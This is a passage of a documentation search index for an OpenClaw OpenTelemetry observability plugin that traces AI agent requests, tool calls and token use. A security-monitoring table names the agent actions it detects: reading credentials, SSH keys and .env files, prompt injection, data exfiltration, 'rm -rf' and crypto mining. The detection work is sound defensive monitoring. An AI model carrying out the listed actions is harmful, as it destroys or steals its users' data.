{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"OpenClaw Observability","text":"<p>OpenTelemetry observability for OpenClaw AI agents \u2014 traces, metrics, and logs.</p>"},{"location":"#two-approaches","title":"Two Approaches","text":"<p>This documentation covers two complementary approaches to OpenClaw observability:</p>"},{"location":"#1-official-diagnostics-plugin-built-in","title":"1. Official Diagnostics Plugin (Built-in)","text":"<p>OpenClaw v2026.2+ includes built-in OTel support via <code>diagnostics.otel</code> config. Best for:</p> <ul> <li>\u2705 Operational metrics (tokens, costs, durations)</li> <li>\u2705 Gateway health monitoring</li> <li>\u2705 Log forwarding</li> <li>\u2705 Simple setup (config only)</li> </ul>"},{"location":"#2-custom-hook-based-plugin-this-repo","title":"2. Custom Hook-Based Plugin (This Repo)","text":"<p>A plugin that hooks into the agent lifecycle for deeper tracing. Best for:</p> <ul> <li>\u2705 Connected distributed traces</li> <li>\u2705 Per-tool-call spans</li> <li>\u2705 Request lifecycle visibility</li> <li>\u2705 Debugging agent behavior</li> </ul> <p>Recommendation: Use both for complete observability.</p>"},{"location":"#quick-start","title":"Quick Start","text":""},{"location":"#official-plugin-5-minutes","title":"Official Plugin (5 minutes)","text":"<p>Add to <code>~/.openclaw/openclaw.json</code>:</p> <pre><code>{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"otel\": {\n      \"enabled\": true,\n      \"endpoint\": \"http://localhost:4318\",\n      \"serviceName\": \"openclaw-gateway\",\n      \"traces\": true,\n      \"metrics\": true,\n      \"logs\": true\n    }\n  }\n}\n</code></pre> <p>Then restart:</p> <pre><code>openclaw gateway restart\n</code></pre>"},{"location":"#custom-plugin-additional","title":"Custom Plugin (Additional)","text":"<ol> <li>Clone the repo</li> <li>Add to <code>plugins.load.paths</code></li> <li>Configure in <code>plugins.entries.otel-observability</code></li> <li>Clear jiti cache and restart</li> </ol> <p>See Getting Started for detailed instructions.</p>"},{"location":"#what-gets-captured","title":"What Gets Captured","text":""},{"location":"#official-plugin","title":"Official Plugin","text":"Signal Data Metrics <code>openclaw.tokens</code>, <code>openclaw.cost.usd</code>, <code>openclaw.run.duration_ms</code>, <code>openclaw.webhook.*</code>, <code>openclaw.message.*</code>, <code>openclaw.queue.*</code>, <code>openclaw.session.*</code> Traces Model usage, webhook processing, message processing, stuck sessions Logs All Gateway logs with severity, subsystem, code location"},{"location":"#custom-plugin-additional_1","title":"Custom Plugin (Additional)","text":"Signal Data Traces <code>openclaw.request</code> \u2192 <code>openclaw.agent.turn</code> \u2192 <code>tool.*</code> (connected hierarchy) Metrics <code>openclaw.llm.tokens.*</code>, <code>openclaw.tool.calls</code>, <code>openclaw.session.resets</code>"},{"location":"#trace-structure-comparison","title":"Trace Structure Comparison","text":"<p>Official Plugin: <pre><code>openclaw.model.usage (standalone span)\nopenclaw.webhook.processed (standalone span)\nopenclaw.message.processed (standalone span)\n</code></pre></p> <p>Custom Plugin: <pre><code>openclaw.request (root span - full lifecycle)\n\u251c\u2500\u2500 openclaw.agent.turn (child)\n\u2502   \u251c\u2500\u2500 tool.Read (child)\n\u2502   \u251c\u2500\u2500 tool.exec (child)\n\u2502   \u2514\u2500\u2500 tool.Write (child)\n</code></pre></p>"},{"location":"#supported-backends","title":"Supported Backends","text":"<p>Works with any OTLP-compatible backend:</p> <ul> <li>Dynatrace \u2014 Direct OTLP ingest</li> <li>Grafana \u2014 Tempo, Loki, Mimir</li> <li>Jaeger \u2014 Distributed tracing</li> <li>Prometheus + Grafana \u2014 Metrics</li> <li>Honeycomb, New Relic, Datadog \u2014 Cloud platforms</li> <li>Local OTel Collector \u2014 Self-hosted</li> </ul>"},{"location":"#documentation","title":"Documentation","text":"<ul> <li>Getting Started \u2014 Setup in 5 minutes</li> <li>Configuration \u2014 All options explained</li> <li>Architecture \u2014 How it works</li> <li>Limitations \u2014 Known constraints</li> <li>Telemetry Reference \u2014 Metric/trace details</li> </ul>"},{"location":"#security-monitoring","title":"Security Monitoring","text":"<ul> <li>Security Detection \u2014 Real-time threat detection</li> <li>Tetragon Integration \u2014 Kernel-level monitoring</li> </ul> <p>The plugin includes real-time security detection for:</p> Detection Severity What It Catches Sensitive File Access Critical Credentials, SSH keys, .env files Prompt Injection High Social engineering attacks on the AI Dangerous Commands Critical Data exfiltration, rm -rf, crypto mining Token Spike Anomaly Warning Unusual usage patterns <p>Combined with Tetragon kernel monitoring, this provides defense-in-depth security observability.</p>"},{"location":"#source","title":"Source","text":"<ul> <li>Official plugin: Built into OpenClaw v2026.2.0+</li> <li>Custom plugin: github.com/henrikrexed/openclaw-observability-plugin</li> </ul>"},{"location":"architecture/","title":"Architecture","text":"<p>How OpenClaw observability works \u2014 both the official plugin and custom hook-based approach.</p>"},{"location":"architecture/#overview-two-approaches","title":"Overview: Two Approaches","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                        OpenClaw Gateway                             \u2502\n\u2502                                                                     \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510   \u2502\n\u2502  \u2502                      Agent Execution                         \u2502   \u2502\n\u2502  \u2502  message_received \u2192 before_agent_start \u2192 tool_calls \u2192       \u2502   \u2502\n\u2502  \u2502                     tool_result_persist \u2192 agent_end          \u2502   \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2502\n\u2502                              \u2502                                      \u2502\n\u2502         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                \u2502\n\u2502         \u2502                    \u2502                    \u2502                \u2502\n\u2502         \u25bc                    \u25bc                    \u25bc                \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u2502\n\u2502  \u2502  Diagnostic \u2502    \u2502  Typed Hooks  \u2502    \u2502   Log Output    \u2502      \u2502\n\u2502  \u2502   Events    \u2502    \u2502  (api.on())   \u2502    \u2502                 \u2502      \u2502\n\u2502  \u2502 (model.usage\u2502    \u2502               \u2502    \u2502                 \u2502      \u2502\n\u2502  \u2502  message.*) \u2502    \u2502               \u2502    \u2502                 \u2502      \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2502\n\u2502         \u2502                   \u2502                     \u2502                \u2502\n\u2502         \u25bc                   \u25bc                     \u25bc                \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510        \u2502\n\u2502  \u2502  OFFICIAL   \u2502    \u2502     CUSTOM      \u2502   \u2502 Log Forward  \u2502        \u2502\n\u2502  \u2502   PLUGIN    \u2502    \u2502     PLUGIN      \u2502   \u2502 (via official\u2502        \u2502\n\u2502  \u2502 diagnostics \u2502    \u2502 otel-observ...  \u2502   \u2502   plugin)    \u2502        \u2502\n\u2502  \u2502    -otel    \u2502    \u2502                 \u2502   \u2502              \u2502        \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518        \u2502\n\u2502         \u2502                   \u2502                    \u2502                 \u2502\n\u2502         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                 \u2502\n\u2502                             \u25bc                                      \u2502\n\u2502                   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                              \u2502\n\u2502                   \u2502 OTLP Exporters  \u2502                              \u2502\n\u2502                   \u2502 (HTTP/protobuf) \u2502                              \u2502\n\u2502                   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                             \u2502\n                             \u25bc\n                   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                   \u2502  OTLP Endpoint  \u2502\n                   \u2502 (Collector or   \u2502\n                   \u2502  Direct Ingest) \u2502\n                   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"architecture/#approach-1-official-plugin-diagnostics-otel","title":"Approach 1: Official Plugin (diagnostics-otel)","text":""},{"location":"architecture/#how-it-works","title":"How It Works","text":"<p>The official plugin uses the diagnostic event bus \u2014 a publish-subscribe system where the Gateway emits events and plugins consume them.</p> <pre><code>Gateway Core                    diagnostics-otel Plugin\n     \u2502                                   \u2502\n     \u2502  emit(\"model.usage\", {...})       \u2502\n     \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                                   \u2502  \u2500\u2500&gt; create span\n     \u2502                                   \u2502  \u2500\u2500&gt; update counters\n     \u2502                                   \u2502  \u2500\u2500&gt; record histogram\n     \u2502                                   \u2502\n     \u2502  emit(\"message.processed\", {...}) \u2502\n     \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                                   \u2502  \u2500\u2500&gt; create span\n     \u2502                                   \u2502  \u2500\u2500&gt; update counters\n</code></pre>"},{"location":"architecture/#diagnostic-events","title":"Diagnostic Events","text":"Event When Emitted Data Included <code>model.usage</code> After LLM call tokens, cost, model, duration <code>webhook.received</code> HTTP request arrives channel, type <code>webhook.processed</code> Handler completes duration, chatId <code>webhook.error</code> Handler fails error message <code>message.queued</code> Added to queue channel, source, depth <code>message.processed</code> Processing done outcome, duration <code>queue.lane.enqueue</code> Lane add lane, size <code>queue.lane.dequeue</code> Lane remove lane, size, wait time <code>session.state</code> State change state, reason <code>session.stuck</code> Stuck detected age, queue depth"},{"location":"architecture/#otel-signals-created","title":"OTel Signals Created","text":"<p>Metrics: <pre><code>openclaw.tokens{type=\"input|output|cache_read|cache_write\"}\nopenclaw.cost.usd\nopenclaw.run.duration_ms\nopenclaw.context.tokens{type=\"limit|used\"}\nopenclaw.webhook.received\nopenclaw.webhook.error\nopenclaw.webhook.duration_ms\nopenclaw.message.queued\nopenclaw.message.processed\nopenclaw.message.duration_ms\nopenclaw.queue.depth\nopenclaw.queue.wait_ms\nopenclaw.session.state\nopenclaw.session.stuck\nopenclaw.session.stuck_age_ms\n</code></pre></p> <p>Traces: - <code>openclaw.model.usage</code> \u2014 Per LLM call span - <code>openclaw.webhook.processed</code> \u2014 Per webhook span - <code>openclaw.webhook.error</code> \u2014 Error span (with status=ERROR) - <code>openclaw.message.processed</code> \u2014 Per message span - <code>openclaw.session.stuck</code> \u2014 Stuck detection span</p> <p>Logs: - All Gateway logs as OTel LogRecords - Includes severity, subsystem, code location</p>"},{"location":"architecture/#approach-2-custom-hook-based-plugin","title":"Approach 2: Custom Hook-Based Plugin","text":""},{"location":"architecture/#how-it-works_1","title":"How It Works","text":"<p>The custom plugin uses typed plugin hooks \u2014 direct callbacks into the agent lifecycle.</p> <pre><code>Gateway Agent Loop              Custom Plugin\n     \u2502                               \u2502\n     \u2502  on(\"message_received\")       \u2502\n     \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502  \u2500\u2500&gt; create ROOT span\n     \u2502                               \u2502      store in sessionContextMap\n     \u2502                               \u2502\n     \u2502  on(\"before_agent_start\")     \u2502\n     \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502  \u2500\u2500&gt; create AGENT TURN span\n     \u2502                               \u2502      (child of root)\n     \u2502                               \u2502\n     \u2502  on(\"tool_result_persist\")    \u2502\n     \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502  \u2500\u2500&gt; create TOOL span\n     \u2502  (called for each tool)       \u2502      (child of agent turn)\n     \u2502                               \u2502\n     \u2502  on(\"agent_end\")              \u2502\n     \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502  \u2500\u2500&gt; end agent turn span\n     \u2502                               \u2502      end root span\n     \u2502                               \u2502      extract tokens from messages\n</code></pre>"},{"location":"architecture/#trace-context-propagation","title":"Trace Context Propagation","text":"<p>The key difference is trace context propagation. The custom plugin maintains a session-to-context map:</p> <pre><code>interface SessionTraceContext {\n  rootSpan: Span;           // openclaw.request\n  rootContext: Context;     // OTel context with root span\n  agentSpan?: Span;         // openclaw.agent.turn\n  agentContext?: Context;   // OTel context with agent span\n  startTime: number;\n}\n\nconst sessionContextMap = new Map&lt;string, SessionTraceContext&gt;();\n</code></pre> <p>When creating child spans, it uses the stored context:</p> <pre><code>// Tool span becomes child of agent turn\nconst span = tracer.startSpan(\n  `tool.${toolName}`,\n  { kind: SpanKind.INTERNAL },\n  sessionCtx.agentContext  // &lt;-- parent context\n);\n</code></pre>"},{"location":"architecture/#resulting-trace-structure","title":"Resulting Trace Structure","text":"<pre><code>openclaw.request (root)\n\u2502   openclaw.session.key: \"main@whatsapp:+123...\"\n\u2502   openclaw.message.channel: \"whatsapp\"\n\u2502   openclaw.request.duration_ms: 4523\n\u2502\n\u2514\u2500\u2500 openclaw.agent.turn (child)\n    \u2502   gen_ai.usage.input_tokens: 1234\n    \u2502   gen_ai.usage.output_tokens: 567\n    \u2502   gen_ai.response.model: \"claude-opus-4-5-...\"\n    \u2502   openclaw.agent.duration_ms: 4100\n    \u2502\n    \u251c\u2500\u2500 tool.Read (child)\n    \u2502       openclaw.tool.name: \"Read\"\n    \u2502       openclaw.tool.result_chars: 2048\n    \u2502\n    \u251c\u2500\u2500 tool.exec (child)\n    \u2502       openclaw.tool.name: \"exec\"\n    \u2502       openclaw.tool.result_chars: 156\n    \u2502\n    \u2514\u2500\u2500 tool.Write (child)\n            openclaw.tool.name: \"Write\"\n            openclaw.tool.result_chars: 0\n</code></pre>"},{"location":"architecture/#data-flow-comparison","title":"Data Flow Comparison","text":""},{"location":"architecture/#official-plugin-token-tracking","title":"Official Plugin: Token Tracking","text":"<pre><code>1. Agent calls LLM via pi-ai\n2. pi-ai returns response with .usage\n3. Gateway calculates cost\n4. Gateway emits \"model.usage\" event with:\n   - usage: {input, output, cacheRead, cacheWrite}\n   - costUsd: 0.0234\n   - model: \"claude-...\"\n   - durationMs: 2341\n5. diagnostics-otel receives event\n6. Creates metrics + span\n7. Batches and exports via OTLP\n</code></pre>"},{"location":"architecture/#custom-plugin-token-tracking","title":"Custom Plugin: Token Tracking","text":"<pre><code>1. Agent calls LLM via pi-ai\n2. pi-ai returns response with .usage\n3. Gateway fires agent_end hook with:\n   - messages: [...including assistant messages with .usage]\n4. Custom plugin:\n   - Parses messages for usage data\n   - Checks for pending diagnostic data (if available)\n   - Adds attributes to existing agent turn span\n   - Updates counters\n5. Ends spans (agent turn, then root)\n6. Batches and exports via OTLP\n</code></pre>"},{"location":"architecture/#resource-and-attributes","title":"Resource and Attributes","text":""},{"location":"architecture/#common-attributes","title":"Common Attributes","text":"Attribute Description <code>service.name</code> Service name from config <code>openclaw.channel</code> Channel (whatsapp, telegram, etc.) <code>openclaw.session.key</code> Session identifier"},{"location":"architecture/#official-plugin-specific","title":"Official Plugin Specific","text":"Attribute Description <code>openclaw.provider</code> LLM provider <code>openclaw.model</code> Model name <code>openclaw.token</code> Token type (input/output/cache_*) <code>openclaw.webhook</code> Webhook update type <code>openclaw.outcome</code> Message outcome <code>openclaw.state</code> Session state"},{"location":"architecture/#custom-plugin-specific","title":"Custom Plugin Specific","text":"Attribute Description <code>openclaw.agent.id</code> Agent identifier <code>openclaw.tool.name</code> Tool name <code>openclaw.tool.call_id</code> Tool call UUID <code>openclaw.tool.result_chars</code> Result size <code>gen_ai.usage.input_tokens</code> Input token count <code>gen_ai.usage.output_tokens</code> Output token count <code>gen_ai.response.model</code> Model used"},{"location":"architecture/#performance-considerations","title":"Performance Considerations","text":""},{"location":"architecture/#batching","title":"Batching","text":"<p>Both plugins use batched export: - Traces: BatchSpanProcessor (default 5s or 512 spans) - Metrics: PeriodicExportingMetricReader (default 60s) - Logs: BatchLogRecordProcessor (default 5s)</p>"},{"location":"architecture/#overhead","title":"Overhead","text":"Plugin Overhead Source Official Event subscription, metric/span creation Custom Hook interception, context map management <p>Both are lightweight \u2014 the OTel SDK handles batching efficiently.</p>"},{"location":"architecture/#sampling","title":"Sampling","text":"<p>Reduce trace volume with <code>sampleRate</code>:</p> <pre><code>{\n  \"diagnostics\": {\n    \"otel\": {\n      \"sampleRate\": 0.1  // 10% of traces\n    }\n  }\n}\n</code></pre>"},{"location":"architecture/#when-to-use-each","title":"When to Use Each","text":"Use Case Recommended Production monitoring Official Cost/token dashboards Official Gateway health alerts Official Debugging specific requests Custom Understanding agent behavior Custom Tool execution analysis Custom Complete observability Both"},{"location":"configuration/","title":"Configuration","text":"<p>Configure OpenClaw's built-in OpenTelemetry diagnostics via <code>~/.openclaw/openclaw.json</code>.</p>"},{"location":"configuration/#full-configuration-example","title":"Full Configuration Example","text":"<pre><code>{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"otel\": {\n      \"enabled\": true,\n      \"endpoint\": \"http://localhost:4318\",\n      \"protocol\": \"http/protobuf\",\n      \"headers\": {\n        \"Authorization\": \"Api-Token dt0c01.xxx\"\n      },\n      \"serviceName\": \"openclaw-gateway\",\n      \"traces\": true,\n      \"metrics\": true,\n      \"logs\": true,\n      \"sampleRate\": 1.0,\n      \"flushIntervalMs\": 5000\n    }\n  }\n}\n</code></pre>"},{"location":"configuration/#configuration-reference","title":"Configuration Reference","text":""},{"location":"configuration/#diagnostics","title":"<code>diagnostics</code>","text":"<p>Top-level diagnostics configuration.</p> Option Type Default Description <code>enabled</code> boolean <code>false</code> Enable the diagnostics system"},{"location":"configuration/#diagnosticsotel","title":"<code>diagnostics.otel</code>","text":"<p>OpenTelemetry export configuration.</p> Option Type Default Description <code>enabled</code> boolean <code>false</code> Enable OTel export <code>endpoint</code> string \u2014 OTLP endpoint URL (required) <code>protocol</code> string <code>\"http/protobuf\"</code> Protocol: <code>\"http/protobuf\"</code> or <code>\"grpc\"</code> <code>headers</code> object <code>{}</code> Custom HTTP headers (e.g., auth tokens) <code>serviceName</code> string <code>\"openclaw\"</code> OTel service name attribute <code>traces</code> boolean <code>true</code> Enable trace export <code>metrics</code> boolean <code>true</code> Enable metrics export <code>logs</code> boolean <code>false</code> Enable log forwarding <code>sampleRate</code> number <code>1.0</code> Trace sampling rate (0.0\u20131.0) <code>flushIntervalMs</code> number \u2014 Export flush interval in milliseconds"},{"location":"configuration/#endpoint-configuration","title":"Endpoint Configuration","text":""},{"location":"configuration/#http-protocol-default","title":"HTTP Protocol (Default)","text":"<p>For OTLP/HTTP endpoints (port 4318):</p> <pre><code>{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"otel\": {\n      \"enabled\": true,\n      \"endpoint\": \"http://localhost:4318\",\n      \"protocol\": \"http/protobuf\"\n    }\n  }\n}\n</code></pre> <p>The endpoint auto-appends <code>/v1/traces</code>, <code>/v1/metrics</code>, <code>/v1/logs</code> as needed.</p>"},{"location":"configuration/#grpc-protocol","title":"gRPC Protocol","text":"<p>For OTLP/gRPC endpoints (port 4317):</p> <pre><code>{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"otel\": {\n      \"enabled\": true,\n      \"endpoint\": \"http://localhost:4317\",\n      \"protocol\": \"grpc\"\n    }\n  }\n}\n</code></pre> <p>Note: gRPC support is experimental.</p>"},{"location":"configuration/#authentication","title":"Authentication","text":""},{"location":"configuration/#bearer-token","title":"Bearer Token","text":"<pre><code>{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"otel\": {\n      \"enabled\": true,\n      \"endpoint\": \"https://api.example.com/otlp\",\n      \"headers\": {\n        \"Authorization\": \"Bearer your-token-here\"\n      }\n    }\n  }\n}\n</code></pre>"},{"location":"configuration/#dynatrace-api-token","title":"Dynatrace API Token","text":"<pre><code>{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"otel\": {\n      \"enabled\": true,\n      \"endpoint\": \"https://{env-id}.live.dynatrace.com/api/v2/otlp\",\n      \"headers\": {\n        \"Authorization\": \"Api-Token dt0c01.xxx...\"\n      }\n    }\n  }\n}\n</code></pre>"},{"location":"configuration/#basic-auth-grafana-cloud","title":"Basic Auth (Grafana Cloud)","text":"<pre><code>{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"otel\": {\n      \"enabled\": true,\n      \"endpoint\": \"https://otlp-gateway-prod-us-central-0.grafana.net/otlp\",\n      \"headers\": {\n        \"Authorization\": \"Basic base64(instanceId:apiKey)\"\n      }\n    }\n  }\n}\n</code></pre>"},{"location":"configuration/#sampling","title":"Sampling","text":"<p>Control trace sampling rate to reduce volume:</p> <pre><code>{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"otel\": {\n      \"enabled\": true,\n      \"endpoint\": \"http://localhost:4318\",\n      \"sampleRate\": 0.1\n    }\n  }\n}\n</code></pre> <ul> <li><code>1.0</code> \u2014 Sample all traces (default)</li> <li><code>0.5</code> \u2014 Sample 50% of traces</li> <li><code>0.1</code> \u2014 Sample 10% of traces</li> <li><code>0.0</code> \u2014 Disable trace sampling</li> </ul>"},{"location":"configuration/#selective-export","title":"Selective Export","text":"<p>Enable only specific signals:</p>"},{"location":"configuration/#traces-only","title":"Traces Only","text":"<pre><code>{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"otel\": {\n      \"enabled\": true,\n      \"endpoint\": \"http://localhost:4318\",\n      \"traces\": true,\n      \"metrics\": false,\n      \"logs\": false\n    }\n  }\n}\n</code></pre>"},{"location":"configuration/#metrics-only","title":"Metrics Only","text":"<pre><code>{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"otel\": {\n      \"enabled\": true,\n      \"endpoint\": \"http://localhost:4318\",\n      \"traces\": false,\n      \"metrics\": true,\n      \"logs\": false\n    }\n  }\n}\n</code></pre>"},{"location":"configuration/#logs-only","title":"Logs Only","text":"<pre><code>{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"otel\": {\n      \"enabled\": true,\n      \"endpoint\": \"http://localhost:4318\",\n      \"traces\": false,\n      \"metrics\": false,\n      \"logs\": true\n    }\n  }\n}\n</code></pre>"},{"location":"configuration/#environment-variables","title":"Environment Variables","text":"<p>OpenClaw also respects standard OTel environment variables as fallbacks:</p> Variable Description <code>OTEL_EXPORTER_OTLP_ENDPOINT</code> Default OTLP endpoint <code>OTEL_EXPORTER_OTLP_PROTOCOL</code> Default protocol <code>OTEL_SERVICE_NAME</code> Default service name <p>Config file values take precedence over environment variables.</p>"},{"location":"configuration/#applying-changes","title":"Applying Changes","text":"<p>After modifying configuration:</p> <pre><code>openclaw gateway restart\n</code></pre> <p>Or trigger a hot reload (if supported):</p> <pre><code>kill -SIGUSR1 $(pgrep -f openclaw-gateway)\n</code></pre>"},{"location":"configuration/#troubleshooting","title":"Troubleshooting","text":""},{"location":"configuration/#configuration-not-applied","title":"Configuration Not Applied?","text":"<p>Check the current config:</p> <pre><code>cat ~/.openclaw/openclaw.json | jq '.diagnostics'\n</code></pre>"},{"location":"configuration/#invalid-config-errors","title":"Invalid Config Errors?","text":"<p>Validate JSON syntax:</p> <pre><code>cat ~/.openclaw/openclaw.json | jq .\n</code></pre>"},{"location":"configuration/#endpoint-unreachable","title":"Endpoint Unreachable?","text":"<p>Test connectivity:</p> <pre><code>curl -v http://localhost:4318/v1/traces\n</code></pre>"},{"location":"development/","title":"Development","text":"<p>How to develop, test, and contribute to the plugin.</p>"},{"location":"development/#setup","title":"Setup","text":"<pre><code># Clone\ngit clone https://github.com/henrikrexed/openclaw-observability-plugin.git\ncd openclaw-observability-plugin\n\n# Install dependencies\nnpm install\n\n# Link to OpenClaw (live development)\nopenclaw plugins install -l .\n\n# Restart gateway to pick up the plugin\nopenclaw gateway restart\n</code></pre>"},{"location":"development/#project-structure","title":"Project Structure","text":"<pre><code>openclaw-observability-plugin/\n\u251c\u2500\u2500 index.ts                    # Plugin entry point\n\u251c\u2500\u2500 src/\n\u2502   \u251c\u2500\u2500 config.ts               # Configuration parsing\n\u2502   \u251c\u2500\u2500 telemetry.ts            # OTel SDK setup (providers, exporters, instruments)\n\u2502   \u251c\u2500\u2500 openllmetry.ts          # GenAI instrumentation status check\n\u2502   \u2514\u2500\u2500 hooks.ts                # OpenClaw event hooks\n\u251c\u2500\u2500 collector/\n\u2502   \u2514\u2500\u2500 otel-collector-config.yaml  # OTel Collector config\n\u251c\u2500\u2500 docs/                       # MkDocs documentation\n\u251c\u2500\u2500 openclaw.plugin.json        # Plugin manifest\n\u251c\u2500\u2500 package.json\n\u251c\u2500\u2500 tsconfig.json\n\u251c\u2500\u2500 mkdocs.yml\n\u2514\u2500\u2500 docker-compose.yaml\n</code></pre>"},{"location":"development/#development-workflow","title":"Development 